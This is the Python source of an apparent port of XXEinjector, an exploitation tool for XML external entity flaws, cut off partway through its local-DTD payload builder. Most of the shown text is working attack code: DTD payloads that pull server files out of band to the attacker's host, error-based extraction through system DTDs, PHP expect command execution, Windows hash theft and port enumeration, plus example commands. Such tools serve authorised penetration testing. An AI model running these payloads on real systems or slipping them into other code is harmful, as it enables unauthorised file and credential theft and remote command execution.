#!/usr/bin/env python3

# XXEinjector by Jakub Palaczynski - Python port of XXEinjector.rb
# Same options, same payloads, same output. Standard library only.

import base64
import http.client
import os
import re
import socket
import ssl
import sys
import threading
import time
from urllib.parse import quote, unquote_plus

# Ruby's URI::RFC2396_Parser#escape leaves these alone
URI_SAFE = "-_.!~*'();/?:@&=+$,[]"


def uriencode(string):
    return quote(string, safe=URI_SAFE)


# CONFIGURE
class G:
    host = ""  # our external ip
    path = ""  # path to enumerate
    file = ""  # file with vulnerable HTTP request
    secfile = ""  # file with second request (2nd order)
    enum = "ftp"  # which out of band protocol should be used - ftp/http/gopher
    logger = "n"  # only log requests, do not send anything

    proto = "http"  # protocol to use - http/https
    proxy = None  # proxy host
    proxy_port = None  # proxy port

    enumports = ""  # which ports should be checked if they are unfiltered
    phpfilter = "n"  # if yes php filter will be used to base64 encode content
    urlencode = "n"  # if injected DTD should be URL encoded
    enumall = "n"  # if yes XXEinjector will not ask what to enum
    brute = ""  # file with paths to bruteforce
    direct = ""  # unique marks between which results are returned
    cdata = "n"  # if CDATA should be used while using direct exploitation

    hashes = "n"  # steal Windows hashes
    upload = ""  # upload this file into temp directory using Java jar schema
    expect = ""  # command that gets executed using PHP expect
    xslt = "n"  # tests for XSLT
    localdtd = ""  # local DTD technique - template name, os, "auto" or "list"
    ldtdfile = ""  # file with custom local DTD templates
    ldtdsink = "file:///nonexistent/"  # nonexistent path that leaks the file
    ldtdtpls = None  # templates still worth trying
    ldtdok = ""  # template that already worked
    ldtdshapes = ["pe", "system"]  # parameter entity or external subset

    test = False  # test mode, shows only payload
    dtdi = "y"  # if yes then DTD is injected automatically
    rproto = "file"  # file or netdoc protocol to retrieve data
    output = "brute.log"  # output file for brute and logger modes
    verbose = "n"  # verbose messaging
    timeout = 10  # timeout for receiving responses
    timeoutset = "n"  # whether --timeout was given explicitly
    contimeout = 30  # timeout used to close connection with server

    port = 0  # remote host application port
    remote = ""  # remote host URL/IP address

    http_port = 80  # http port that receives contents and serves XML files
    ftp_port = 21  # ftp port that receives file contents/directory listings
    gopher_port = 70  # gopher port that receives contents
    jar_port = 1337  # port accepts connections and then sends files
    xslt_port = 1337  # port that is used to test for XSLT injection

    response = None  # holds HTTP response body
    filenames = []  # filenames to enumerate
    nextpath = ""  # temp path holders for enumeration
    enumpath = ""
    tmppath = ""
    directpath = ""
    method = "POST"  # HTTP method
    secmethod = "POST"
    switch = 0  # locks enumeration if response is pending
    time = 1  # HTTP response timeout
    cut = 0  # whether a leading slash was removed from the path
    done = 0  # whether the current file was already logged

    dtd = ""  # DTD to inject
    xsl = ""  # XSL to inject
    uri = ""
    headers = {}
    post = ""
    securi = ""
    secheaders = {}
    secpost = ""
    reqline = ""  # request line of the request file
    reqheaders = []  # header lines of the request file
    reqbody = ""  # body of the request file, byte for byte
    secreqline = ""
    secreqheaders = []
    secreqbody = ""
    brutelines = None  # file with paths to bruteforce, read once
    rhostset = "n"  # whether --rhost was given explicitly


# local DTD templates - a DTD that is already on the target is repurposed by
# redefining one of its parameter entities. Value start and tail close the
# declaration that entity is used in, so our own declarations end up on top
# level. Format: name|os|dtd path|entity|value start|tail
LOCALDTDS = [
    r'docbookx|linux|file:///usr/share/yelp/dtd/docbookx.dtd|ISOamso||',
    r'fonts|linux|file:///usr/share/xml/fontconfig/fonts.dtd|constant|aaa)>|<!ELEMENT aa (bb',
    r'cim20|windows|file:///C:\Windows\System32\wbem\xml\cim20.dtd|CIMName|>|<!ELEMENT aa "bb"',
    r'xwizard|windows|file:///C:\Windows\System32\xwizard.dtd|onerrortypes|(aa) #IMPLIED>|<!ATTLIST attxx aa "bb"',
]

# regex to find directory listings
REGEX = re.compile(r"[$.\-_~ 0-9A-Za-z]+")

# array that contains skipped and allowed paths
blacklist = []
whitelist = []

LOG_LOCK = threading.Lock()


def die(code=1):
    sys.stdout.flush()
    sys.exit(code)


def hard_exit(code=1):
    # exit the whole process from a server thread, like Ruby's exit in a thread
    sys.stdout.flush()
    os._exit(code)


def ask(prompt="> "):
    # Readline.readline equivalent, EOF behaves like an empty answer
    try:
        sys.stdout.write(prompt)
        sys.stdout.flush()
        return sys.stdin.readline().rstrip("\n")
    except (EOFError, KeyboardInterrupt):
        return None


def b64dec(data):
    # Base64.decode64 is lenient about junk and padding
    data = re.sub(r"[^A-Za-z0-9+/=]", "", data).rstrip("=")
    data += "=" * (-len(data) % 4)
    try:
        return base64.b64decode(data).decode("latin-1")
    except Exception:
        return ""


def ruby_split(text, sep):
    # Ruby's String#split drops trailing empty fields
    parts = text.split(sep)
    while parts and parts[-1] == "":
        parts.pop()
    return parts


def readlines_raw(path):
    # keep bytes intact - request files and responses may hold any byte
    with open(path, "rb") as handle:
        return handle.read().decode("latin-1").splitlines(keepends=True)


# set all variables
def parse_args(argv):
    for arg in argv:
        if arg.startswith("--host="):
            G.host = arg.split("=", 1)[1]
        if arg.startswith("--path="):
            G.path = arg.split("=", 1)[1]
        if arg.startswith("--file="):
            G.file = arg.split("=", 1)[1]
        if arg.startswith("--oob="):
            G.enum = arg.split("=", 1)[1]
        if "--ssl" in arg:
            G.proto = "https"
        if arg.startswith("--proxy="):
            G.proxy = arg.split("=", 1)[1].split(":")[0]
            G.proxy_port = arg.split("=", 1)[1].split(":")[1]
        if "--phpfilter" in arg:
            G.phpfilter = "y"
        if "--fast" in arg:
            G.enumall = "y"
        if arg.startswith("--brute="):
            G.brute = arg.split("=", 1)[1]
        if "--verbose" in arg:
            G.verbose = "y"
        if arg.startswith("--xsltport="):
            G.xslt_port = int(arg.split("=", 1)[1])
        if arg.startswith("--httpport="):
            G.http_port = int(arg.split("=", 1)[1])
        if arg.startswith("--ftpport="):
            G.ftp_port = int(arg.split("=", 1)[1])
        if arg.startswith("--gopherport="):
            G.gopher_port = int(arg.split("=", 1)[1])
        if arg.startswith("--jarport="):
            G.jar_port = int(arg.split("=", 1)[1])
        if arg.startswith("--timeout="):
            G.timeout = int(arg.split("=", 1)[1])
            G.timeoutset = "y"
        if "--hashes" in arg:
            G.hashes = "y"
        if arg.startswith("--upload="):
            G.upload = arg.split("=", 1)[1]
        if arg.startswith("--expect="):
            G.expect = arg.split("=", 1)[1]
        if arg.startswith("--enumports="):
            G.enumports = arg.split("=", 1)[1]
        if "--urlencode" in arg:
            G.urlencode = "y"
        if "--nodtd" in arg:
            G.dtdi = "n"
        if "--xslt" in arg and not arg.startswith("--xsltport="):
            G.xslt = "y"
        if arg.startswith("--localdtd="):
            G.localdtd = arg.split("=", 1)[1]
        if arg == "--localdtd":
            G.localdtd = "auto"
        if arg.startswith("--localdtdfile="):
            G.ldtdfile = arg.split("=", 1)[1]
        if arg.startswith("--localdtdsink="):
            G.ldtdsink = arg.split("=", 1)[1]
        if arg.startswith("--direct="):
            G.direct = arg.split("=", 1)[1]
        if "--logger" in arg:
            G.logger = "y"
            G.brute = "logger"
        if arg.startswith("--output="):
            G.output = arg.split("=", 1)[1]
        if arg.startswith("--2ndfile="):
            G.secfile = arg.split("=", 1)[1]
        if "--netdoc" in arg:
            G.rproto = "netdoc"
        if arg.startswith("--contimeout="):
            G.contimeout = int(arg.split("=", 1)[1])
        if arg.startswith("--rport="):
            G.port = int(arg.split("=", 1)[1])
        if arg.startswith("--rhost="):
            G.remote = arg.split("=", 1)[1]
            G.rhostset = "y"
        if "--test" in arg:
            G.test = True
        if "--cdata" in arg and arg != "--cdata-xml":
            G.cdata = "y"


def show_info_flags(argv):
    host = G.host if G.host != "" else "YOUR_HOST"
    http_port = G.http_port if G.http_port != "" else "HTTPPORT"

    # show DTD to inject
    if "--oob-xml" in argv:
        print("")
        print('<!DOCTYPE m [ <!ENTITY %% remote SYSTEM "http://%s:%s/file.dtd">%%remote;%%int;%%trick;]>'
              % (host, http_port))
        print("")
        die()

    # show sample direct exploitation XML
    if "--direct-xml" in argv:
        print("")
        print('<!DOCTYPE m [ <!ENTITY direct SYSTEM "XXEINJECT">]><tag>UNIQUEMARK&direct;UNIQUEMARK</tag>')
        print("")
        die()

    # show built-in local DTD templates
    if "--localdtd=list" in argv:
        print("")
        print("Built-in local DTD templates:")
        print("name|os|dtd path|entity|value start|tail")
        for line in LOCALDTDS:
            print("  " + line)
        print("")
        print("Pick one with --localdtd=docbookx, all of an OS with --localdtd=linux,")
        print("or try every one with --localdtd. Templates for other DTDs can be added")
        print("in a file of the same format and loaded with --localdtdfile=/tmp/dtds.txt.")
        print("")
        print("Each template is tried in two shapes: the published one that pulls the DTD")
        print("in with a parameter entity, and one that loads it as the external subset")
        print('(<!DOCTYPE x SYSTEM "dtd" [ ... ]>), which is the shape libxml accepts.')
        print("")
        die()

    # show sample direct exploitation XML using local DTD
    if "--localdtd-xml" in argv:
        print("")
        print("Payload to put in the request file by hand. SuperClass and the path have to")
        print("match a DTD that is present on the target. --localdtd automates this and")
        print("--localdtd=list prints the templates it knows.")
        print('<!DOCTYPE m [ <!ENTITY % local_dtd SYSTEM "PUT_HERE_PATH_TO_LOCAL_DTD"><!ENTITY % SuperClass \'><!ENTITY &#x25; file SYSTEM "XXEINJECT"><!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">&#x25;eval;&#x25;error;\'>%local_dtd;]>')
        print("")
        die()

    # show sample direct exploitation XML with CDATA
    if "--cdata-xml" in argv:
        print("")
        print('<!DOCTYPE m [ <!ENTITY %% a "<![CDATA["><!ENTITY %% local SYSTEM "XXEINJECT"><!ENTITY %% remote SYSTEM "http://%s:%s/file.dtd"><!ENTITY %% z "]]>">%%remote;]><tag>UNIQUEMARK&join;UNIQUEMARK</tag>'
              % (host, http_port))
        print("")
        die()


def show_menu():
    me = os.path.basename(__file__)
    print("XXEinjector by Jakub Pa\u0142aczy\u0144ski")
    print("")
    print("XXEinjector automates retrieving files using direct and out of band methods. Directory listing only works in Java applications. Bruteforcing method needs to be used for other applications.")
    print("")
    print("Options:")
    print("  --host\tMandatory - our IP address for reverse connections. (--host=192.168.0.2)")
    print("  --file\tMandatory - file containing valid HTTP request with xml. You can also mark with \"XXEINJECT\" a point where DTD should be injected. (--file=/tmp/req.txt)")
    print("  --path\tMandatory if enumerating directories - Path to enumerate. (--path=/etc)")
    print("  --brute\tMandatory if bruteforcing files - File with paths to bruteforce. (--brute=/tmp/brute.txt)")
    print("  --logger\tLog results only. Do not send requests. HTTP logger looks for \"p\" parameter with results.")
    print("")
    print("  --rhost\tRemote host's IP address or domain name. Use this argument only for requests without Host header. (--rhost=192.168.0.3)")
    print("  --rport\tRemote host's TCP port. Use this argument only for requests without Host header and for non-default values. (--rport=8080)")
    print("")
    print("  --oob\t\tOut of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)")
    print("  --direct\tUse direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --direct-xml to see how XML in request file should look like or --localdtd-xml if you want to build a local DTD payload by hand. Use --localdtd for the automated local DTD technique. In case of any problems with start and end marks when special characters are present in reponse before or after output data please use Burp Proxy match and replace option to replace that. (--direct=UNIQUEMARKSTART,UNIQUEMARKEND)")
    print("  --cdata\tImprove direct exploitation with CDATA. Data is retrieved directly, however OOB is used to construct CDATA payload. Specify --cdata-xml to see how request should look like in this technique.")
    print("  --2ndfile\tFile containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)")
    print("  --phpfilter\tUse PHP filter to base64 encode target file before sending.")
    print("  --netdoc\tUse netdoc protocol instead of file (Java).")
    print("  --enumports\tEnumerating unfiltered ports for reverse connection. Specify value \"all\" to enumerate all TCP ports. (--enumports=21,22,80,443,445)")
    print("")
    print("  --hashes\tSteals Windows hash of the user that runs an application.")
    print("  --expect\tUses PHP expect extension to execute arbitrary system command. Best works with HTTP and PHP filter. (--expect=ls)")
    print("  --upload\tUploads specified file using Java jar schema into temp file. (--upload=/tmp/upload.txt)")
    print("  --xslt\tTests for XSLT injection.")
    print("  --localdtd\tLocal DTD technique. Retrieves files in band, from an error message, by repurposing a DTD that is already on the target. Needs --brute. Use --localdtd to try every built-in template, --localdtd=linux/windows for one OS, --localdtd=NAME for a single one or --localdtd=list to see them. (--localdtd=docbookx)")
    print("  --localdtdfile\tFile with custom local DTD templates in the same format as --localdtd=list prints, one per line. (--localdtdfile=/tmp/dtds.txt)")
    print("  --localdtdsink\tNonexistent path that leaks the file in the error message. (--localdtdsink=file:///nonexistent/)")
    print("")
    print("  --ssl\t\tUse SSL.")
    print("  --proxy\tProxy to use. (--proxy=127.0.0.1:8080)")
    print("  --httpport\tSet custom HTTP port. (--httpport=80)")
    print("  --ftpport\tSet custom FTP port. (--ftpport=21)")
    print("  --gopherport\tSet custom gopher port. (--gopherport=70)")
    print("  --jarport\tSet custom port for uploading files using jar. (--jarport=1337)")
    print("  --xsltport\tSet custom port for XSLT injection test. (--xsltport=1337)")
    print("")
    print("  --test\tThis mode shows request with injected payload and quits. Used to verify correctness of request without sending it to a server.")
    print("  --urlencode\tURL encode injected DTD. This is default for URI.")
    print("  --nodtd\tIf you want to put DTD in request by yourself. Specify \"--oob-xml\" to show how DTD should look like.")
    print("  --output\tOutput file for bruteforcing and logger mode. By default it logs to brute.log in current directory. (--output=/tmp/out.txt)")
    print("  --timeout\tTimeout for receiving file/directory content. Defaults to 10, or to 1 with --direct and --localdtd, where results come back in the response and there is nothing to wait for. (--timeout=20)")
    print("  --contimeout\tTimeout for closing connection with server. This is used to prevent DoS condition. (--contimeout=20)")
    print("  --fast\tSkip asking what to enumerate. Prone to false-positives.")
    print("  --verbose\tShow verbose messages.")
    print("")
    print("Example usage:")
    print("  Enumerating /etc directory in HTTPS application:")
    print("  python3 %s --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --ssl" % me)
    print("  Enumerating /etc directory using gopher for OOB method:")
    print("  python3 %s --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher" % me)
    print("  Second order exploitation:")
    print("  python3 %s --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt --2ndfile=/tmp/2ndreq.txt" % me)
    print("  Bruteforcing files using HTTP out of band method and netdoc protocol:")
    print("  python3 %s --host=192.168.0.2 --brute=/tmp/filenames.txt --file=/tmp/req.txt --oob=http --netdoc" % me)
    print("  Enumerating using direct exploitation:")
    print("  python3 %s --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARKSTART,UNIQUEMARKEND" % me)
    print("  Enumerating unfiltered ports:")
    print("  python3 %s --host=192.168.0.2 --file=/tmp/req.txt --enumports=all" % me)
    print("  Stealing Windows hashes:")
    print("  python3 %s --host=192.168.0.2 --file=/tmp/req.txt --hashes" % me)
    print("  Uploading files using Java jar:")
    print("  python3 %s --host=192.168.0.2 --file=/tmp/req.txt --upload=/tmp/uploadfile.pdf" % me)
    print("  Executing system commands using PHP expect:")
    print("  python3 %s --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter --expect=ls" % me)
    print("  Testing for XSLT injection:")
    print("  python3 %s --host=192.168.0.2 --file=/tmp/req.txt --xslt" % me)
    print("  Retrieving files through an error message with a local DTD:")
    print("  python3 %s --file=/tmp/req.txt --brute=/tmp/filenames.txt --localdtd --phpfilter" % me)
    print("  Log requests only:")
    print("  python3 %s --logger --oob=http --output=/tmp/out.txt" % me)
    print("")
    die()


### Processing Request File ###

# read a request file into request line, headers and body. Tolerates what
# people really export: CRLF or lone CR line endings, a UTF-8 BOM, no trailing
# newline, a whitespace-only separator line and a request without a body.
def readreq(path, what):
    if not os.path.isfile(path):
        print("[-] Cannot find %s file: %s" % (what, path))
        die()
    with open(path, "rb") as handle:
        raw = handle.read().decode("latin-1")
    if raw[:3] == "\xef\xbb\xbf":
        raw = raw[3:]
    if raw.strip() == "":
        print("[-] %s file is empty: %s" % (what.capitalize(), path))
        die()

    # split into lines, keeping their terminators, so the body stays verbatim
    lines = re.findall(r"[^\r\n]*(?:\r\n|\r|\n)|[^\r\n]+$", raw)
    while lines and lines[0].strip() == "":
        lines.pop(0)

    # the first blank or whitespace-only line separates headers from body
    sepidx = None
    for n in range(1, len(lines)):
        if lines[n].strip() == "":
            sepidx = n
            break
    head = lines if sepidx is None else lines[:sepidx]
    body = "" if sepidx is None else "".join(lines[sepidx + 1:])

    reqline = head[0].strip() if head else ""
    target = reqline.split(" ")[1] if len(reqline.split(" ")) > 1 else ""
    if len(reqline.split(" ")) < 2 or not (target.startswith("/") or
                                           target.startswith("http") or target == "*"):
        print("[-] First line of %s file is not an HTTP request line: %s" % (what, reqline))
        print("[-] It should look like: POST /path/file.php HTTP/1.1")
        die()
    lines = head[1:]

    nobody = reqline.split(" ")[0].upper() in ("GET", "HEAD", "TRACE", "OPTIONS",
                                               "MOVE", "COPY", "DELETE")
    if sepidx is None and not nobody:
        print("[-] No empty line between headers and body in %s file." % what)
        print("[-] Add an empty line after the last header, before the XML.")
        die()

    headers = []
    for raw_line in lines:
        line = re.sub(r"\r?\n$", "", raw_line)
        line = re.sub(r"\r$", "", line)
        if line.strip() == "":
            continue
        if ":" in line:
            headers.append(line)
        else:
            print("[-] Ignoring line in %s file, it is not a header: %s" % (what, line.strip()))
    return reqline, headers, body


def get_host_and_port():
    hostline = None
    for header in G.reqheaders:
        if re.match(r"(?i)^Host[ \t]*:", header):
            hostline = header
            break
    if hostline is not None and G.rhostset == "n":
        value = hostline.split(":", 1)[1].strip()
        if ":" in value:
            G.remote = value.split(":")[0]
            G.port = value.split(":")[1]
        else:
            G.remote = value

    if G.port == 0:
        G.port = 80 if G.proto == "http" else 443
    if G.remote == "":
        print("[-] Cannot find Host header in the request file.")
        print("[-] Use --rhost to set the target and --rport for a non-default port.")
        die()


def inject_marker(text, payload):
    # literal replacement, then the URL encoded variants of "?>"
    out = text.replace("?>", "?>" + payload, 1)
    if out == text:
        for pattern in (r"(\?%3e)", r"(%3f>)", r"(%3f%3e)"):
            new = re.sub(pattern, lambda m: m.group(1) + payload, out, count=1, flags=re.I)
            if new != out:
                return new, True
        return out, False
    return out, True


# Configure main request
def configreq():
    found = 0  # for detecting injected DTD

    # assign HTTP method
    G.method = G.reqline.split(" ")[0]

    # get URI path
    G.uri = G.reqline.split(" ")[1]
    if G.dtdi == "y":
        turi = unquote_plus(G.uri)
        if "XXEINJECT" in turi:
            if G.direct != "":
                G.uri = G.uri.replace("XXEINJECT", G.rproto + ":///" + G.directpath, 1)
                found = found + 1
            elif G.xslt == "n":
                G.uri = G.uri.replace("XXEINJECT", uriencode(G.dtd).replace("%20", "+"), 1)
                found = found + 1
            else:
                G.uri = G.uri.replace(
                    "XXEINJECT",
                    uriencode(G.xsl).replace("%20", "+").replace("?", "%3F").replace("=", "%3D"), 1)
                found = found + 1
        elif "<?xml" in turi and G.direct == "":
            if G.xslt == "n":
                G.uri, hit = inject_marker(G.uri, uriencode(G.dtd).replace("%20", "+"))
                if hit:
                    found = found + 1
            else:
                payload = uriencode(G.xsl).replace("%20", "+").replace("?", "%3F").replace("=", "%3D")
                if re.search(r"(<\?xml)(.*)(&)", turi, re.I):
                    for pattern in (r"(<\?xml)(.*)(&)", r"(%3c%3fxml)(.*)(&)",
                                    r"(%3c\?xml)(.*)(&)", r"(<%3fxml)(.*)(&)"):
                        G.uri = re.sub(pattern, lambda m: payload + "&", G.uri, count=1, flags=re.I)
                    found = found + 1
                elif re.search(r"(<\?xml)(.*)", turi, re.I):
                    for pattern in (r"(<\?xml)(.*)", r"(%3c%3fxml)(.*)",
                                    r"(%3c\?xml)(.*)", r"(<%3fxml)(.*)"):
                        G.uri = re.sub(pattern, lambda m: payload, G.uri, count=1, flags=re.I)
                    found = found + 1

    # get headers
    G.headers = {}
    for raw in G.reqheaders:
        if not re.match(r"(?i)^Host[ \t]*:", raw):
            header = raw
            if G.dtdi == "y" and "XXEINJECT" in header:
                if G.direct != "":
                    header = header.replace("XXEINJECT", G.rproto + ":///" + G.directpath, 1)
                    found = found + 1
                elif G.urlencode == "y":
                    if G.xslt == "n":
                        header = header.replace(
                            "XXEINJECT",
                            uriencode(G.dtd).replace("%20", "+").replace(";", "%3B"), 1)
                    else:
                        header = header.replace(
                            "XXEINJECT",
                            uriencode(G.xsl).replace("%20", "+").replace("?", "%3F")
                            .replace("=", "%3D").replace(";", "%3B"), 1)
                    found = found + 1
                else:
                    header = header.replace("XXEINJECT", G.dtd if G.xslt == "n" else G.xsl, 1)
                    found = found + 1
            if "Accept-Encoding" in header and G.direct != "":
                pass
            else:
                # split once, a value may contain ": " as well
                name, _, value = header.partition(":")
                G.headers[name.strip()] = value.strip()

    # get body
    G.post = ""
    postfind = 0
    for postline in G.reqbody.splitlines(keepends=True):
        if G.dtdi == "y":
            tline = unquote_plus(postline)
            if "XXEINJECT" in tline and G.xslt == "n":
                if G.direct != "":
                    postline = postline.replace("XXEINJECT", G.rproto + ":///" + G.directpath, 1)
                    found = found + 1
                elif G.urlencode == "y":
                    postline = postline.replace("XXEINJECT", uriencode(G.dtd).replace("%20", "+"), 1)
                    found = found + 1
                else:
                    postline = postline.replace("XXEINJECT", G.dtd, 1)
                    found = found + 1
            elif "XXEINJECT" in tline and G.xslt == "y":
                postfind = 1
            elif "<?xml" in tline and G.xslt == "n" and G.direct == "":
                if G.urlencode == "y":
                    postline, hit = inject_marker(postline, uriencode(G.dtd).replace("%20", "+"))
                else:
                    postline, hit = inject_marker(postline, G.dtd)
                if hit:
                    found = found + 1
            elif "<?xml" in tline and G.xslt == "y":
                postfind = 1
        G.post += postline

    if postfind == 1:
        if G.urlencode == "y":
            payload = uriencode(G.xsl).replace("%20", "+").replace("?", "%3F").replace("=", "%3D")
        else:
            payload = G.xsl
        if re.search(r"(<\?xml)(.*)(&)", G.post, re.I | re.S) or \
           re.search(r"(%3c%3fxml)(.*)(&)", G.post, re.I | re.S) or \
           re.search(r"(%3c\?xml)(.*)(&)", G.post, re.I | re.S) or \
           re.search(r"(<%3fxml)(.*)(&)", G.post, re.I | re.S):
            for pattern in (r"(<\?xml)(.*)(&)", r"(%3c%3fxml)(.*)(&)",
                            r"(%3c\?xml)(.*)(&)", r"(<%3fxml)(.*)(&)"):
                G.post = re.sub(pattern, lambda m: payload + "&", G.post, count=1, flags=re.I | re.S)
        elif re.search(r"(<\?xml)(.*)", G.post, re.I | re.S) or \
                re.search(r"(%3c%3fxml)(.*)", G.post, re.I | re.S) or \
                re.search(r"(%3c\?xml)(.*)", G.post, re.I | re.S) or \
                re.search(r"(<%3fxml)(.*)", G.post, re.I | re.S):
            for pattern in (r"(<\?xml)(.*)", r"(%3c%3fxml)(.*)",
                            r"(%3c\?xml)(.*)", r"(<%3fxml)(.*)"):
                G.post = re.sub(pattern, lambda m: payload, G.post, count=1, flags=re.I | re.S)
        else:
            G.post = G.post.replace("XXEINJECT", payload, 1)
        found = found + 1

    # update Content-Length header
    if "Content-Length" in G.headers:
        G.headers["Content-Length"] = str(len(G.post.encode("latin-1")))

    # detect injected DTD
    if found == 0 and G.dtdi == "y":
        print("[-] Automatic DTD injection was not successful. Please put \"XXEINJECT\" in request file where DTD should be placed or run XXEinjector with --nodtd if DTD was placed manually.")
        die()
    elif found > 1:
        print("[-] Multiple instances of XML found. It may results in false-positives.")


### End of Processing Request File ###

### Configure request for 2nd order case ###

def configsecreq():
    G.secmethod = G.secreqline.split(" ")[0]
    G.securi = G.secreqline.split(" ")[1]

    G.secheaders = {}
    for raw in G.secreqheaders:
        if re.match(r"(?i)^Host[ \t]*:", raw):
            continue
        if "Accept-Encoding" in raw:
            continue
        name, _, value = raw.partition(":")
        G.secheaders[name.strip()] = value.strip()

    G.secpost = G.secreqbody


### End of Processing 2nd Request File ###

def host_header():
    port = int(G.port)
    if (G.proto == "http" and port == 80) or (G.proto == "https" and port == 443):
        return G.remote
    return "%s:%d" % (G.remote, port)


def send(method, uri, body, headers):
    # returns the response body, or None when the request did not complete
    nobody = method in ("GET", "HEAD", "TRACE", "OPTIONS", "MOVE", "COPY", "DELETE")
    port = int(G.port)
    if G.proto == "https":
        context = ssl._create_unverified_context()
        if G.proxy:
            conn = http.client.HTTPSConnection(G.proxy, int(G.proxy_port),
                                               timeout=G.time, context=context)
            conn.set_tunnel(G.remote, port)
        else:
            conn = http.client.HTTPSConnection(G.remote, port, timeout=G.time, context=context)
        target = uri
    else:
        if G.proxy:
            conn = http.client.HTTPConnection(G.proxy, int(G.proxy_port), timeout=G.time)
            # plain HTTP through a proxy uses the absolute form
            target = "http://%s%s" % (host_header(), uri)
        else:
            conn = http.client.HTTPConnection(G.remote, port, timeout=G.time)
            target = uri

    try:
        conn.putrequest(method, target, skip_host=True, skip_accept_encoding=True)
        for key, value in headers.items():
            if key is None or key == "":
                continue
            conn.putheader(key, "" if value is None else value)
        conn.putheader("Host", host_header())
        if nobody:
            conn.endheaders()
        else:
            conn.endheaders(body.encode("latin-1"))
        response = conn.getresponse()
        return response.read().decode("latin-1")
    finally:
        try:
            conn.close()
        except Exception:
            pass


# Sending request
def sendreq():
    if G.test:
        print("URL:")
        print("%s://%s:%s%s" % (G.proto, G.remote, G.port, G.uri))
        print("\nHeaders:")
        print(G.headers)
        if G.post != "":
            print("\nRequest body:")
            print(G.post)
        die()

    if G.verbose == "y":
        print("[+] Sending request with malicious XML:")
        print("%s://%s:%s%s" % (G.proto, G.remote, G.port, G.uri))
        print(G.headers)
        print("\n")
        print(G.post)
        print("\n")
    else:
        print("[+] Sending request with malicious XML.")

    G.response = None
    try:
        G.response = send(G.method, G.uri, G.post, G.headers)
    except socket.timeout:
        print("[-] Timed out waiting for the response.")
    except (OSError, ssl.SSLError, http.client.HTTPException) as error:
        print("[-] Request failed: %s: %s" % (type(error).__name__, error))


# Sending second request
def send2ndreq():
    if G.verbose == "y":
        print("[+] Sending second request:")
        print("%s://%s:%s%s" % (G.proto, G.remote, G.port, G.securi))
        print(G.secheaders)
        print("\n")
        print(G.secpost)
        print("\n")
    else:
        print("[+] Sending second request.")

    G.response = None
    try:
        G.response = send(G.secmethod, G.securi, G.secpost, G.secheaders)
    except socket.timeout:
        print("[-] Timed out waiting for the second response.")
    except (OSError, ssl.SSLError, http.client.HTTPException) as error:
        print("[-] Second request failed: %s: %s" % (type(error).__name__, error))


# response body, empty string when the request failed or timed out
def respbody():
    return G.response if G.response is not None else ""


# logging to separate file or output file if in bruteforce mode
def log(param):
    with LOG_LOCK:
        if G.brute == "":
            logpath = G.path
            if G.direct == "":
                if G.tmppath != "" and not logpath.endswith("/"):
                    logpath += "/"
                logpath += G.tmppath
            else:
                if G.nextpath != "" and not logpath.endswith("/"):
                    logpath += "/"
                logpath += G.nextpath
            logpath = logpath.replace("\\", "/")
            if logpath.startswith("/"):
                logpath = logpath[1:]
            if logpath.endswith("/"):
                logpath = logpath[:-1]
            base = os.path.join("Logs", G.remote)
            if G.tmppath != "" or "/" in logpath:
                parent = "/".join(logpath.split("/")[0:-1])
                os.makedirs(os.path.join(base, parent), exist_ok=True)
            else:
                os.makedirs(os.path.join(base, logpath), exist_ok=True)
            if G.done == 0:
                G.done = 1
            name = "rootdir.log" if logpath == "" else logpath + ".log"
            with open(os.path.join(base, name), "a") as handle:
                handle.write(param)
        else:
            with open(G.output, "a") as handle:
                handle.write(param)
            if G.logger == "y" or G.verbose == "y":
                print("%s\n" % param)
            if G.logger == "y":
                sys.stdout.write("> ")
                sys.stdout.flush()


# pushing enumerated items to an array
def pusharr(param):
    if G.brute == "":
        param = param.rstrip("\r\n")
        if REGEX.fullmatch(param):
            if G.direct == "":
                logp = G.tmppath
                if G.tmppath != "":
                    logp += "/"
            else:
                logp = G.nextpath
                if G.nextpath != "":
                    logp += "/"
            logp += param
            G.filenames.append(logp)
            print(logp)


# parse a local DTD template: name|os|dtd path|entity|value start|tail
def ldtdparse(line):
    if line is None or line.strip() == "" or line.strip()[0] == "#":
        return None
    fields = line.split("|")
    if len(fields) < 4:
        return None
    while len(fields) < 6:
        fields.append("")
    return {"name": fields[0].strip(), "os": fields[1].strip(), "path": fields[2].strip(),
            "entity": fields[3].strip(), "vstart": fields[4], "tail": fields[5]}


# templates to try - built-in ones plus the ones from --localdtdfile
def ldtdtemplates():
    tpls = []
    for line in LOCALDTDS:
        tpl = ldtdparse(line)
        if tpl is not None:
            tpls.append(tpl)
    if G.ldtdfile != "":
        if not os.path.isfile(G.ldtdfile):
            print("[-] Local DTD template file not found: %s" % G.ldtdfile)
            die()
        for line in readlines_raw(G.ldtdfile):
            tpl = ldtdparse(line.rstrip("\r\n"))
            if tpl is not None:
                tpls.append(tpl)
    if G.localdtd == "auto":
        return tpls
    sel = [t for t in tpls if t["name"] == G.localdtd or t["os"] == G.localdtd]
    if not sel:
        print("[-] No local DTD template named \"%s\". Use --localdtd=list to see them." % G.localdtd)
        die()
    return sel


# build the payload for one template, one target file and one shape
def ldtdpayload(tpl, target, phpfilter, shape):
    res = target
    if phpfilter == "y":
        res = "php://filter/read=convert.base64-encode/resource=%s" % target
    override = ("<!ENTITY %% %s '%s" % (tpl["entity"], tpl["vstart"]) +
                "<!ENTITY &#x25; file SYSTEM \"%s\">" % res +
                "<!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;%s&#x25;file;&#x27;>\">" % G.ldtdsink +
                "&#x25;eval;&#x25;error;%s'>" % tpl["tail"])
    if shape == "system":
        # local DTD becomes the external subset, our redefinition is read first.
        # libxml needs this one - it rejects the parameter entity shape with
        # "PEReferences forbidden in internal subset"
        return "<!DOCTYPE convert SYSTEM \"%s\" [%s]>" % (tpl["path"], override)
    # local DTD is pulled in with a parameter entity, as published
